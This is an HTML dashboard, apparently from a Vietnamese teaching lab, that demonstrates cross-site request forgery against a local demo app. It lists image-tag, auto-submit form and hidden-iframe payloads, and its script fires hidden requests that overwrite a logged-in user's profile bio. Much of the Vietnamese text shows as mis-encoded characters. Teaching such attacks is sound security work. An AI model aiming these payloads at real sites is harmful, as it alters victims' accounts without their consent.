<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Attack Demo - Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1a1a2e;
            color: #eee;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        header {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            padding: 30px;
            border-radius: 10px;
            margin-bottom: 30px;
            text-align: center;
        }

        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }

        .warning-badge {
            background: #f39c12;
            color: #1a1a2e;
            padding: 10px 20px;
            border-radius: 20px;
            display: inline-block;
            font-weight: bold;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .card {
            background: #16213e;
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
        }

        .card h2 {
            color: #e74c3c;
            margin-bottom: 15px;
            font-size: 1.5em;
        }

        .step {
            background: #0f3460;
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 4px solid #e74c3c;
        }

        .step-number {
            background: #e74c3c;
            color: white;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 10px;
        }

        .button {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1em;
            margin: 10px 5px;
            transition: transform 0.2s;
        }

        .button:hover {
            transform: scale(1.05);
        }

        .button.safe {
            background: linear-gradient(135deg, #27ae60 0%, #229954 100%);
        }

        .code-block {
            background: #0a0e27;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }

        .status {
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            display: none;
        }

        .status.show {
            display: block;
        }

        .status.error {
            background: #e74c3c;
            color: white;
        }

        .status.success {
            background: #27ae60;
            color: white;
        }

        .status.info {
            background: #3498db;
            color: white;
        }

        .attack-controls {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin: 20px 0;
        }

        .info-box {
            background: #f39c12;
            color: #1a1a2e;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
        }

        .info-box strong {
            display: block;
            margin-bottom: 5px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 15px 0;
        }

        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #0f3460;
        }

        th {
            background: #e74c3c;
            color: white;
        }

        tr:hover {
            background: #0f3460;
        }

        .badge {
            display: inline-block;
            padding: 5px 10px;
            border-radius: 3px;
            font-size: 0.85em;
            font-weight: bold;
        }

        .badge.vulnerable {
            background: #e74c3c;
            color: white;
        }

        .badge.protected {
            background: #27ae60;
            color: white;
        }

        footer {
            text-align: center;
            padding: 20px;
            color: #95a5a6;
            margin-top: 30px;
        }

        .iframe-container {
            width: 100%;
            height: 0;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>üî• CSRF Attack Demo Dashboard</h1>
            <div class="warning-badge">‚ö†Ô∏è EDUCATION PURPOSE ONLY</div>
        </header>

        <div class="grid">
            <!-- Card 1: H∆∞·ªõng d·∫´n -->
            <div class="card">
                <h2>üìã H∆∞·ªõng D·∫´n S·ª≠ D·ª•ng</h2>
                <div class="step">
                    <span class="step-number">1</span>
                    <strong>Kh·ªüi ƒë·ªông server:</strong>
                    <div class="code-block">npm start</div>
                </div>
                <div class="step">
                    <span class="step-number">2</span>
                    <strong>ƒêƒÉng nh·∫≠p v√†o ·ª©ng d·ª•ng:</strong>
                    <div class="code-block">http://localhost:5173</div>
                </div>
                <div class="step">
                    <span class="step-number">3</span>
                    <strong>Th·ª±c hi·ªán t·∫•n c√¥ng:</strong>
                    <div class="attack-controls">
                        <button class="button" onclick="launchAttack('bio')">
                            üéØ T·∫•n C√¥ng Bio
                        </button>
                        <button class="button" onclick="launchAttack('custom')">
                            üõ†Ô∏è T·∫•n C√¥ng T√πy Ch·ªânh
                        </button>
                    </div>
                </div>
                <div class="step">
                    <span class="step-number">4</span>
                    <strong>Ki·ªÉm tra k·∫øt qu·∫£:</strong> V√†o Profile xem Bio
                </div>
            </div>

            <!-- Card 2: Attack Vectors -->
            <div class="card">
                <h2>üéØ C√°c Ki·ªÉu T·∫•n C√¥ng</h2>
                <table>
                    <thead>
                        <tr>
                            <th>Ph∆∞∆°ng Th·ª©c</th>
                            <th>Endpoint</th>
                            <th>Tr·∫°ng Th√°i</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>IMG Tag</td>
                            <td>/api/profile/update-bio</td>
                            <td><span class="badge vulnerable">VULNERABLE</span></td>
                        </tr>
                        <tr>
                            <td>Form Submit</td>
                            <td>/api/profile/update-bio</td>
                            <td><span class="badge vulnerable">VULNERABLE</span></td>
                        </tr>
                        <tr>
                            <td>XMLHttpRequest</td>
                            <td>/api/profile (PUT)</td>
                            <td><span class="badge protected">PROTECTED</span></td>
                        </tr>
                        <tr>
                            <td>Fetch API</td>
                            <td>/api/profile (PUT)</td>
                            <td><span class="badge protected">PROTECTED</span></td>
                        </tr>
                    </tbody>
                </table>
            </div>

            <!-- Card 3: Payloads -->
            <div class="card">
                <h2>üí£ Payloads M·∫´u</h2>
                <div class="info-box">
                    <strong>1. IMG Tag Attack:</strong>
                    <div class="code-block">&lt;img src="http://localhost:3000/api/profile/update-bio?bio=HACKED" /&gt;</div>
                </div>
                <div class="info-box">
                    <strong>2. Form Auto-Submit:</strong>
                    <div class="code-block">&lt;form action="http://localhost:3000/api/profile/update-bio" method="GET"&gt;
  &lt;input type="hidden" name="bio" value="HACKED"/&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</div>
                </div>
                <div class="info-box">
                    <strong>3. Hidden iFrame:</strong>
                    <div class="code-block">&lt;iframe src="http://localhost:3000/api/profile/update-bio?bio=HACKED" style="display:none"&gt;&lt;/iframe&gt;</div>
                </div>
            </div>

            <!-- Card 4: Monitoring -->
            <div class="card">
                <h2>üìä Gi√°m S√°t T·∫•n C√¥ng</h2>
                <div id="attackLog"></div>
                <button class="button safe" onclick="checkProfile()">
                    üîç Ki·ªÉm Tra Profile
                </button>
                <button class="button" onclick="clearLog()">
                    üóëÔ∏è X√≥a Log
                </button>
            </div>
        </div>

        <!-- Status Messages -->
        <div id="statusMessage" class="status"></div>

        <!-- Hidden Attack Payloads -->
        <div class="iframe-container" id="attackContainer"></div>

        <footer>
            <p>‚ö†Ô∏è Demo n√†y  v√† nghi√™n c·ª©u b·∫£o m·∫≠t</p>
            <p>Kh√¥ng s·ª≠ d·ª•ng ƒë·ªÉ t·∫•n c√¥ng h·ªá th·ªëng th·ª±c t·∫ø</p>
        </footer>
    </div>

    <script>
        let attackCount = 0;

        function showStatus(message, type = 'info') {
            const statusDiv = document.getElementById('statusMessage');
            statusDiv.textContent = message;
            statusDiv.className = `status show ${type}`;
            setTimeout(() => {
                statusDiv.classList.remove('show');
            }, 5000);
        }

        function addLog(message, type = 'info') {
            attackCount++;
            const logDiv = document.getElementById('attackLog');
            const timestamp = new Date().toLocaleTimeString('vi-VN');
            const logEntry = document.createElement('div');
            logEntry.className = 'info-box';
            logEntry.style.background = type === 'error' ? '#e74c3c' : type === 'success' ? '#27ae60' : '#3498db';
            logEntry.style.color = 'white';
            logEntry.innerHTML = `
                <strong>[${timestamp}] Attack #${attackCount}</strong>
                ${message}
            `;
            logDiv.insertBefore(logEntry, logDiv.firstChild);
            
            // Gi·ªõi h·∫°n 5 log g·∫ßn nh·∫•t
            while (logDiv.children.length > 5) {
                logDiv.removeChild(logDiv.lastChild);
            }
        }

        function launchAttack(type) {
            if (type === 'bio') {
                const payload = encodeURIComponent('üî• T√ÄI KHO·∫¢N ƒê√É B·ªä T·∫§‡§® C√îNG CSRF! Hacked at ' + new Date().toLocaleTimeString('vi-VN'));
                const attackUrl = `http://localhost:3000/api/profile/update-bio?bio=${payload}`;
                
                // T·∫°o th·∫ª img ·∫©n ƒë·ªÉ trigger attack
                const img = document.createElement('img');
                img.src = attackUrl;
                img.style.display = 'none';
                img.onload = () => {
                    showStatus('‚úÖ T·∫•n c√¥ng th√†nh c√¥ng! Ki·ªÉm tra Profile ƒë·ªÉ xem k·∫øt qu·∫£.', 'success');
                    addLog('Bio attack executed successfully', 'success');
                };
                img.onerror = () => {
                    showStatus('‚ö†Ô∏è C√≥ th·ªÉ t·∫•n c√¥ng ƒë√£ th√†nh c√¥ng (server tr·∫£ v·ªÅ non-image response)', 'info');
                    addLog('Bio attack executed (check profile to verify)', 'info');
                };
                
                document.getElementById('attackContainer').appendChild(img);
                
                addLog(`Payload sent: ${attackUrl}`, 'info');
                showStatus('üöÄ ƒêang th·ª±c hi·ªán t·∫•n c√¥ng CSRF...', 'info');
            } else if (type === 'custom') {
                const customBio = prompt('Nh·∫≠p n·ªôi dung Bio t√πy ch·ªânh:', 'Custom Attack Message');
                if (customBio) {
                    const payload = encodeURIComponent(customBio);
                    const attackUrl = `http://localhost:3000/api/profile/update-bio?bio=${payload}`;
                    
                    const img = document.createElement('img');
                    img.src = attackUrl;
                    img.style.display = 'none';
                    document.getElementById('attackContainer').appendChild(img);
                    
                    addLog(`Custom attack: ${customBio}`, 'info');
                    showStatus('üöÄ T·∫•n c√¥ng t√πy ch·ªânh ƒë√£ ƒë∆∞·ª£c g·ª≠i!', 'info');
                }
            }
        }

        function checkProfile() {
            showStatus('üîç M·ªü console ƒë·ªÉ xem k·∫øt qu·∫£...', 'info');
            
            fetch('http://localhost:3000/api/profile', {
                credentials: 'include'
            })
            .then(res => res.json())
            .then(data => {
                console.log('Current Profile:', data);
                alert(`Current Bio: ${data.bio || 'No bio set'}`);
                addLog(`Profile checked. Bio: ${data.bio || 'No bio'}`, 'success');
            })
            .catch(err => {
                console.error('Error:', err);
                alert('Error: B·∫°n c·∫ßn ƒëƒÉng nh·∫≠p tr∆∞·ªõc!');
                addLog('Profile check failed - Not authenticated', 'error');
            });
        }

        function clearLog() {
            document.getElementById('attackLog').innerHTML = '';
            attackCount = 0;
            showStatus('üóëÔ∏è Log ƒë√£ ƒë∆∞·ª£c x√≥a', 'success');
        }

        // Auto-log on page load
        window.addEventListener('load', () => {
            addLog('Dashboard loaded - Ready to demo CSRF attacks', 'info');
            console.log('%c‚ö†Ô∏è CSRF ATTACK DEMO DASHBOARD', 'color: red; font-size: 20px; font-weight: bold;');
            console.log('This is for educational purposes only!');
        });
    </script>
</body>
</html>
